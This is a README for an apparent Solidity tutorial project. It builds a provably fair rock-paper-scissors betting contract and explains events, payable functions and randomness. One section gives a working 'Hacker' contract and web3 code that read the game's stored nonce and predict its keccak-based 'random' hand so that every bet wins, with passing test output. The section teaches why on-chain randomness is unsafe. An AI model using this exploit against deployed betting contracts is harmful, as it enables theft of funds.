# Solidity Game - Rock Paper Scissors

## Task

_The task is divided into 2 "levels". You my choose to either finish both or just the first one depending on your skill level._

### Level 1 Requirement

As the bare minimum, you're required to build an on-chain rock paper scissors game that's _provable fair_. Players use Ethers for placing bets, and get nothing back in case they lose, and twice the amount otherwise.

"Provable fairness" means that any technically competent player can independently verify that the host didn't have any advantage over her in any game she played. However you implement this "provable fairness" is entirely up to you.

### Level 2 Requirement

On top of the level-1 task above, instead of giving back twice the bet amount when the player wins, 5% of that goes into a "fomo pool". Whenever a player places a bet:

- If the fomo time is off, the time is started an set to end at 1 hour from bet placement time.
- Otherwise extend the time to 1 hour from the bet placement time if the bet amount is at least 10% of the pool size.

If the fomo timer goes to zero, the last bettor that either turned on or extended the timer wins all the amount in the fomo pool, and the fomo timer is turned off.

## What will you learn?

1. [Enum](https://docs.soliditylang.org/en/v0.8.5/types.html#enums)
2. [Events](https://docs.soliditylang.org/en/v0.8.5/contracts.html#events) and `indexed`, and "topic"??
3. `payable` function
4. Random Number
5. `receive` function
6. **Underflow** and **Overflow**
7. truffle test
8. **Hacking Contracts** 🤪🤪🤪

## What is the most difficult challenge?

### How can you simply code hand to hand rock-paper-scissors comparison result?

How many `if` statements do you expect?

In my opinion, only 2 `if`s are enough to compare the hand circle, no matter how many hands.

```solidity
/**
 * Compare Hands.
 *
 * @param _a - The one side
 * @param _b - The another side
 * @return The comparison result. 0: equal, 1: _a wins, -1: _b wins
 */
function compareHand(Hand _a, Hand _b) internal pure returns (int8) {
  uint8 a = uint8(_a);
  uint8 b = uint8(_b);
  if (a == b) return 0;
  if ((a + 1) % 3 == b) return -1;
  return 1;
}

```

### What is the balance when you query it inside `payable` function?

Inside `payable` function, when you query the balance, the Ether sender sent has been added to it.

```solidity
    /// @dev Bet fee has been included to the host balance already at the point.
    require(address(this).balance >= msg.value * 2, "LevelOne: Insufficient host fund.");
```

### What is "Topic"?, What is the relation with `indexed` keyword?

Topics are indexed parameters to an event.

`topic[0]` always refers to the hash of the hash of the event itself, and can have up to 3 indexed arguments, which will each be reflected in the topics.

EVM uses low-level primitives called logs to map them to high-level Solidity construct called Event. Logs may contain different topics that are indexed arguments.

Consider Event:

```solidity
  event PersonCreated(uint indexed age, uint height);
```

And you fire it the foobar function of MyContract:

```solidity
function foobar() {
  emit PersonCreated(26, 176);
}

```

This will create a low-level EVM log entry with topics

- 0x6be15e8568869b1e100750dd5079151b32637268ec08d199b318b793181b8a7d (Keccak-256 hash of `PersonCreated(uint256,uint256)`)

- 0x36383cc9cfbf1dc87c78c2529ae2fcd4e3fc4e575e154b357ae3a8b2739113cf (Keccak-256 hash of `age`), value 26

You'll notice that height will not be a topic, but it will be included in the data section of the event.

Internally, your Ethereum node (Geth / Parity) will index arguments to build on indexable search indexes, so that you can easily do look ups by value later. Because creating indexes takes additional disk space, indexed parameters in events have additional gas cost. However, indexed are required to any meaningful look up in scale of events by value later.

Now in the web3 client you want to watch for creation events of all persons that are `age` of 26, you can simply do:

```javascript
var createdEvent = myContract.PersonCreated({ age: 26 });
createdEvent.watch(function (err, result) {
  if (err) {
    console.log(err);
    return;
  }
  console.log("Found ", result);
});
```

Or you could filter all past events in similar fashion.

More information here

- http://solidity.readthedocs.io/en/develop/miscellaneous.html?highlight=topic#modifiers

- http://solidity.readthedocs.io/en/develop/contracts.html?highlight=topic#events

- https://media.consensys.net/technical-introduction-to-events-and-logs-in-ethereum-a074d65dd61e#.7w96id6rs

- https://emn178.github.io/online-tools/keccak_256.html

## Security Considerations - Random Numbers

All good games require some level of randomness. So how do we generate random numbers in Solidity?

The real answer here is, you can't. Well, at least you can't do it safely.

Let's look at why.

### Random number generation via `keccak256`

The best source of randomness we have in Solidity is the `keccak256` hash function.

We could do something like the following to generate a random number:

```solidity
// Generate a random number between 1 and 100:
uint randNonce = 0;
uint random = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % 100;
randNonce++;
uint random2 = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % 100;
```

What this would do is take the timestamp of `now`, the `msg.sender`, and an incrementing `nonce` (a number that is only ever used once, so we don't run the same hash function with the same input parameters twice).

It would then "pack" the inputs and use `keccak` to convert them to a random hash. Next, it would convert that hash to a `uint`, and then use `% 100` to take only the last 2 digits. This will give us a totally random number between 0 and 99.

### This method is vulnerable to attack by a dishonest node

In Ethereum, when you call a function on a contract, you broadcast it to a node or nodes on the network as a **_transaction_**. The nodes on the network then collect a bunch of transactions, try to be the first to solve a computationally-intensive mathematical problem as a "Proof of Work", and then publish that group of transactions along with their Proof of Work (PoW) as a **_block_** to the rest of the network.

Once a node has solved the PoW, the other nodes stop trying to solve the PoW, verify that the other node's list of transactions are valid, and then accept the block and move on to trying to solve the next block.

**This makes our random number function exploitable.**

Let's say we had a coin flip contract — heads you double your money, tails you lose everything. Let's say it used the above random function to determine heads or tails. (`random >= 50` is heads, `random < 50` is tails).

If I were running a node, I could publish a transaction **only to my own node** and not share it. I could then run the coin flip function to see if I won — and if I lost, choose not to include that transaction in the next block I'm solving. I could keep doing this indefinitely until I finally won the coin flip and solved the next block, and profit.

### Hacking Contract

The game contract looks beautiful, seems to work very nice. Also, look at the random function, it looks very complicated, and seems not to be hackable simply.

The game contract uses three different seeds for its' random function.

- randNonce - Increases every time once generated a random number. Prevents transaction reusing.
- block.timestamp - Provides variant based on time.
- msg.sender - The sender address. Prevents multi-transaction attacks.

Unfortunately, all those three are vulnerable.

- randNonce - publically readable on the blockchain, remember that nothing is hidden on the blockchain.
- block.timestamp - unlike any other program language, it doesn't represent the elapsed time of the function execution. All same across the transaction chain.
- msg.sender - Huh, ridiculous! 😝

Too many words, just wanna see?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

import "./LevelOne.sol";

contract Hacker {
  address payable public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  /**
   * Attack the game contract.
   *
   * @param _target - The address of the game contract
   * @param _hostRandNonce - The randNonce of the game contract, front-end will read the game's storage and let hacker know the value. 🤪🤪🤪
   */
  function attack(address _target, uint256 _hostRandNonce)
    public
    payable
    onlyHacker
  {
    // Simulate the host's hand. 😝😝😝
    LevelOne.Hand hostHand = getHostHand(_hostRandNonce);
    // Guess the winning hand depends on host's one.
    LevelOne.Hand hackerHand = LevelOne.Hand((uint8(hostHand) + 1) % 3);

    bytes memory sig = abi.encodeWithSignature("bet(uint8)", hackerHand);
    bool result = false;

    assembly {
      // Load the length (first 32 bytes)
      let len := mload(sig)
      // Skip over the length field.
      let data := add(sig, 0x20)
      result := call(
        gas(), // gas
        _target, // target address
        callvalue(), // ether
        data, // input location
        len, // length of input params
        0, // output location
        0 // no need to use output params
      )
    }

    require(result, "Hacker: Failed!");
  }

  /**
   * @dev Hacker simulates game's hand.
   * @param _randNonce - The host's current randNonce, provided through front-end
   *
   * Get the host's hand based on random number.
   *
   * @return a different hand every time called.
   */
  function getHostHand(uint256 _randNonce)
    internal
    view
    returns (LevelOne.Hand)
  {
    uint256 rand = randMod(90, _randNonce);
    if (rand < 30) {
      return LevelOne.Hand.rock;
    } else if (rand < 60) {
      return LevelOne.Hand.paper;
    }
    return LevelOne.Hand.scissors;
  }

  /**
   * @dev Hacker simulates game's random function.
   * @dev block.timestamp is the same as host gets.
   * @dev Replace msg.sender with the current address.
   * @param _randNonce - The host's current randNonce, provided through front-end
   *
   * Generate random number between 0 to _modulus.
   * Not secure! 😞
   *
   * @param _modulus - The max - 1 of the random number range
   */
  function randMod(uint256 _modulus, uint256 _randNonce)
    internal
    view
    returns (uint256)
  {
    return
      uint256(
        keccak256(
          abi.encodePacked(block.timestamp, address(this), _randNonce + 1)
        )
      ) % _modulus;
  }

  /**
   * Receive Ether.
   * If hacker won, the game contract will send back twice of our bet.
   */
  receive() external payable {}

  /**
   * Withdraw Ether to owner, the only way to take back Ether for hacker.
   * @dev you can transfer inside receive function, because insufficient gas to process, as the host use transfer to return Ether.
   */
  function withdraw() external onlyHacker {
    hacker.transfer(address(this).balance);
  }
}

```

**See how Hacker guess randNonce**

```javascript
// Read storage of the game contract
const randNonce = await web3.eth.getStorageAt(
  game.address, // address of the contract
  1 // index of slot - uint256 private randNonce = 0;
);
const result = await hackerContract.attack(game.address, randNonce, {
  from: _hacker,
  value: web3.utils.toWei("1", "gwei"),
});
expect(result.receipt.status).to.equal(true);
expect(result.receipt.rawLogs[0].topics[0]).to.be.equal(wonEventSignature);
```

**Test Hacker**

```
Using network 'develop'.


Compiling your contracts...
===========================
> Compiling .\contracts\Hacker.sol
> Compiling .\contracts\LevelOne.sol
> Compiled successfully using:
   - solc: 0.8.5+commit.a4f2e591.Emscripten.clang



  Contract: Hacker
    should win always
      √ should win (200ms)
      √ should win (188ms)
      √ should win (178ms)
      √ should win (172ms)
      √ should win (188ms)
      √ should win (174ms)
      √ should win (204ms)
      √ should win (239ms)
      √ should win (431ms)
      √ should win (203ms)


  10 passing (5s)

```

## So how do we generate random numbers safely in Ethereum?

Because the entire contents of the blockchain are visible to all participants, this is a hard problem, and its solution is beyond the scope of this tutorial. You can read <a href="https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract" target=_new>this StackOverflow thread</a> for some ideas. One idea would be to use an **_oracle_** to access a random number function from outside of the Ethereum blockchain.

Of course, since tens of thousands of Ethereum nodes on the network are competing to solve the next block, my odds of solving the next block are extremely low. It would take me a lot of time or computing resources to exploit this profitably — but if the reward were high enough (like if I could bet $100,000,000 on the coin flip function), it would be worth it for me to attack.

So while this random number generation is NOT secure on Ethereum, in practice unless our random function has a lot of money on the line, the users of your game likely won't have enough resources to attack it.

Because we're just building a simple game for demo purposes in this tutorial and there's no real money on the line, we're going to accept the tradeoffs of using a random number generator that is simple to implement, knowing that it isn't totally secure.

In our other repositories, we may cover using **_oracles_** (a secure way to pull data in from outside of Ethereum) to generate secure random numbers from outside the blockchain.

## Configuration

### Install Truffle cli

_Skip if you have already installed._

```
npm install -g truffle
```

### Install Dependencies

```
yarn install
```

## Test and Attack!💥

### Run Tests

```
truffle develop
test
```

```
truffle(develop)> test
Using network 'develop'.


Compiling your contracts...
===========================
> Everything is up to date, there is nothing to compile.



  Contract: Hacker
    should win always
      √ should win (197ms)
      √ should win (249ms)
      √ should win (250ms)
      √ should win (188ms)
      √ should win (240ms)
      √ should win (187ms)
      √ should win (240ms)
      √ should win (258ms)
      √ should win (182ms)
      √ should win (209ms)

  Contract: LevelOne
    fund
      √ should revert when player send insufficent fee (557ms)
      √ should revert when host has insufficient fund (267ms)
    game
      √ should work in fair (429ms)
      √ should work in fair (432ms)
      √ should work in fair (559ms)
      √ should work in fair (529ms)
      √ should work in fair (443ms)
      √ should work in fair (550ms)
      √ should work in fair (443ms)
      √ should work in fair (521ms)
      √ should work in fair (426ms)
      √ should work in fair (533ms)

  Contract: LevelTwo
    √ should start fomo timer (635ms)
    √ should deposit fomo (712ms)
    √ should extend fomo timer (1244ms)
    √ should withdraw fomo to winner (943ms)


  26 passing (19s)

```
